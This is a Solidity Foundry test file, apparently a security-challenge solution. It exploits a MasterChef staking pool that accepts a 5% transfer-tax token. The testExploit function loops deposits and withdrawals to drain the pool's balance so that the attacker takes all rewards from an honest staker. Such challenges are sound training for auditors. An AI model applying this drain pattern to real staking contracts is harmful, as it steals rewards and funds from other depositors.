// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Token} from "../../src/Token.sol";
import {MulaToken} from "../../src/inflationary-net-worth/MulaToken.sol";
import {MasterChef, IMuny} from "../../src/inflationary-net-worth/MasterChef.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

contract InflationaryNetWorthTest is Test {
  Utilities private utils;

  address payable private attacker;
  address payable private user;

  MulaToken private mula;
  Token private muny;
  MasterChef private masterChef;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(2);
    attacker = users[0];
    user = users[1];
    vm.label(attacker, "Attacker");
    vm.label(user, "User");

    // Staking token
    mula = new MulaToken("MULA", "MULA");
    mula.mint(user, 10_000e18);
    mula.mint(attacker, 10_000e18);

    // Reward token
    muny = new Token("MUNY", "MUNY");

    uint256 munyPerBlock = 1e18;
    masterChef = new MasterChef(
      IMuny(address(muny)),
      address(this),
      munyPerBlock,
      block.number,
      block.number
    );

    muny.transferOwnership(address(masterChef));

    // Start MULA staking
    uint256 allocPoint = 1000;
    masterChef.add(allocPoint, IERC20(mula), false);

    vm.startPrank(user);
    mula.approve(address(masterChef), type(uint256).max);
    masterChef.deposit(0, 10_000e18);
    vm.stopPrank();

    assertEq(mula.balanceOf(address(masterChef)), 10_000e18 * 95 / 100);
    assertEq(muny.balanceOf(attacker), 0);

    vm.prank(attacker);
    mula.approve(address(masterChef), type(uint256).max);

    // Simulate staking over time
    vm.roll(120);
  }

  function testExploit() public {
    // Exploit start
    vm.startPrank(attacker, attacker);

    // Staking pool loses 5% of total deposited
    // amount each time attacker withdraws his deposit

    uint256 attackerBalance = mula.balanceOf(attacker);
    uint256 masterChefBalance;

    while (true) {
        masterChef.deposit(0,attackerBalance);
        masterChefBalance = mula.balanceOf(address(masterChef))-1;

        if (masterChefBalance < attackerBalance) {
            masterChef.withdraw(0,masterChefBalance);
            break;
        } else {
            masterChef.withdraw(0,attackerBalance);
        }

        attackerBalance = attackerBalance * 95 / 100; // post transfer tax
    }

    vm.stopPrank();
    // Exploit end

    validate();
  }

  function validate() private {
    vm.roll(block.number + 1);

    // Attacker must receive all rewards in a single call to deposit
    vm.prank(attacker);
    masterChef.deposit(0, 1);

    assertEq(muny.balanceOf(attacker), 120e18);
    assertEq(muny.balanceOf(user), 0);
    assertEq(muny.balanceOf(address(masterChef)), 0);
  }
}
